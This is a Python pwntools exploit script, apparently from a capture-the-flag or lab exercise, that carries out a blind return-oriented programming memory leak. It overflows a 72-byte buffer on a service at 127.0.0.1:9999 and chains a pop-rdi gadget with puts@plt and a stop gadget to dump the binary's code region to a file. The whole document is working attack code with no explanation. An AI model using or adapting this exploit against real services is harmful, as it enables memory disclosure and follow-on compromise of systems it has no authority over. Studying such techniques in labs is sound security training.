from pwn import *

def leak_unit(length, rdi_ret, puts_plt, leak_addr, stop_gadget):
  io = remote('127.0.0.1',9999)
  
  payload = b'a'*length + p64(rdi_ret) + p64(leak_addr) + p64(puts_plt) + p64(stop_gadget)  
  io.recvuntil(b'password?\n')
  
  io.sendline(payload)
  
  try:
      data = io.recv()
      print(data)
      io.close()
      try:
          data = data[:data.index(b'\nWelCome')]
      except Exception:
          data = data
      print("Data is:\n",data)
      if data == b'':
          data = b'\x00'
      return data
  except Exception:
      print('\n What the hell happened?! This should be none\n')
      io.close()
      return None

def leak_memory(length, stop_gadget, brop_gadget, rdi_ret, puts_plt, init_addr):
  result = b""
  addr = init_addr
  while addr < 0x401000:
    print('\n', hex(addr))
    data = leak_unit(length, rdi_ret, puts_plt, addr, stop_gadget)
    if data is None:

      continue
    else:
      result += data
    addr += len(data)
  
  """ Restore the memory leaked from the exploit script """
  with open('code', 'wb') as f:
    f.write(result)


if __name__ == "__main__":
    length = 72
    stop_gadget = 0x4006b6
    brop_gadget = 0x4007ba
    rdi_ret = 0x4007c3
    puts_plt = 0x400560
    init_addr = 0x400000
    leak_memory(length, stop_gadget, brop_gadget, rdi_ret, puts_plt, init_addr)

